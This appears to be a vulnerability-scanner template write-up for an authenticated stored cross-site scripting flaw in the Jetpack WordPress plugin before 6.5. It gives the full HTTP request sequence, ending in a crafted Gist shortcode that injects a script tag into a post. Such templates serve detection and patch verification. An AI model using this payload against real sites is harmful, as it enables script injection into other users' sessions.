# Nuclei Template: Jetpack < 6.5 - Stored Cross-Site Scripting
**Template ID:** jetpack-stored-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** Medium
**Source:** Nuclei Template (`jetpack-gist-xss.yaml`)

## Vulnerability Information & PoC

## Description
Detected authenticated stored XSS in Jetpack < 6.5 via crafted Gist shortcode.

## Steps to reproduce / Exploit Payload
```http
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In

GET /wp-admin/post-new.php HTTP/1.1
Host: {{Hostname}}

POST /wp-admin/post.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

_wpnonce={{nonce}}&_wp_http_referer={{referer}}&user_ID={{user_id}}&action=editpost&originalaction=editpost&post_author={{user_id}}&post_type=post&original_post_status=auto-draft&referredby=&_wp_original_http_referer=&auto_draft=1&post_ID={{post_id}}&post_title=XSS+Test&content=[gist]"></script><script>alert(document.domain)</script><script src="[/gist]&post_status=draft&hidden_post_status=draft&visibility=public&hidden_post_visibility=public&mm=12&jj=26&aa=2025&hh=04&mn=18&ss=00&hidden_mm=12&hidden_jj=26&hidden_aa=2025&hidden_hh=04&hidden_mn=18&save=Save+Draft

GET /wp-admin/post.php?post={{post_id}}&action=edit HTTP/1.1
Host: {{Hostname}}
```

## References
- https://wpscan.com/vulnerability/5e63453f-4d95-4bc3-9338-2d77f95f9ee7/
- https://wordpress.org/plugins/jetpack/
